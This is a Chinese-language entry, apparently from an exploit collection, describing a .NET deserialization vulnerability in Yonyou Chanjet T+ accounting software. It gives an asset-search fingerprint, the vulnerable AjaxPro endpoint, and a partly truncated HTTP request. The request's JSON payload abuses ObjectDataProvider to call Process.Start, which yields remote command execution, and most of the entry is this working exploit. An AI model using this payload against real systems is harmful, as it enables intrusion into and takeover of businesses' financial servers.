# 用友畅捷通TPlusGetStoreWarehouseByStore.net反序列化漏洞

- **系统**：用友　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`app.name="畅捷通 T+"`
- **请求**：`POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1`

**请求体 / payload**
```
* 当回显为`actorId`或`archivesId`不能为空，则表示存在该漏洞
X-Ajaxpro-Method: GetStoreWarehouseByStore
Host: xx.xx.xx.xx
Content-type: application/x-www-form-urlencoded
Content-Length: 566
"storeID":{
"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
"MethodName":"Start",
"ObjectInstance":{
"__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
"StartInfo":{
"__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77…（脚本共 767 字，完整版见原文）
```

**其他**
- 用友畅捷通TPlus GetStoreWarehouseByStore .net反序列化漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友畅捷通TPlus